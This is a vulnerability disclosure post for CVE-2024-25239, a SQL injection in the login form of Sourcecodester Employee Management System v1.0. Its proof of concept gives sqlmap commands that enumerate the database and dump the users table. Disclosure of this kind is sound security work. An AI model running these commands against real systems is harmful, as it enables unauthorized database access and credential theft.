---
layout: single
title: Sourcecodester Employee Management System using PHP and MySQL v1.0 - SQL Injection
excerpt: "Report for a SQL Injection vulnerability found on Sourcecodester Employee Management System using PHP and MySQL v1.0"
date: 2024-01-27
classes: wide
header:
  teaser: /assets/images/employee-management-system/logo.jpeg
  teaser_home_page: true
categories:
  - CVE
  - Report
  - SQLi
tags:
  - cve
  - sqli
---

## Details:
- Date: 27-01-2024
- Affected Version: v1.0
- Vendor Homepage: [https://www.sourcecodester.com/](https://www.sourcecodester.com/)
- Vendor Notification: 27-01-2024
- Advisory Publication: 27-01-2024 (with no technical details)
- Public Disclosure: 27-02-2024
- Software Link: [https://www.sourcecodester.com/php/16999/employee-management-system.html](https://www.sourcecodester.com/php/16999/employee-management-system.html)
- CVE Assigned: [CVE-2024-25239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25239)
- Author: Josué Mier (aka blu3ming)

## Description:
SQL injection is a type of cyber attack where attackers exploit vulnerabilities in input fields of web applications to insert malicious SQL code. By doing so, they can gain unauthorized access to databases, steal sensitive data, or even manipulate database contents. Preventative measures, such as input validation and parameterized queries, are essential for protecting against SQL injection attacks and maintaining database security.
## Affected Locations:
- `http://localhost/employee_akpoly/Account/login.php`, txtemail parameter
- emloyee_akpoly/Account/login.php, Line 18
## Proof of Concept:
As observed in the screenshot below, when we send a SQL query with a time delay in the "txtemail" field for the Employees' login portal, the web application takes the established time (10 seconds) to return a response, suggesting a potential time-based blind SQL injection vulnerability.

![1]

Once this indication of a potential SQL injection is found, we proceed to dump database-related information using the sqlmap tool. Next, we attempt to find the database name with the following command:

```
sqlmap "http://localhost/employee_akpoly/Account/login.php" --data="txtemail=email&txtpassword=pass&btnlogin=" --flush-session --level=5 --risk=3 --dbs
```

We observe that it is also susceptible to boolean-based blind SQL injection.

![2]

Once the database name is found, we proceed to dump the tables:

```
sqlmap "http://localhost/employee_akpoly/Account/login.php" --data="txtemail=test&txtpassword=test&btnlogin=" --flush-session --level=5 --risk=3 -D employee_akpoly --tables
```

![3]

Subsequently, we dump all the information from the "users" table:
```
sqlmap "http://localhost/employee_akpoly/Account/login.php" --data="txtemail=test&txtpassword=test&btnlogin=" --flush-session --level=5 --risk=3 -D employee_akpoly -T users --dump
```

![4]

[1]:/assets/images/employee-management-system/1.png
[2]:/assets/images/employee-management-system/2.png
[3]:/assets/images/employee-management-system/3.png
[4]:/assets/images/employee-management-system/4.png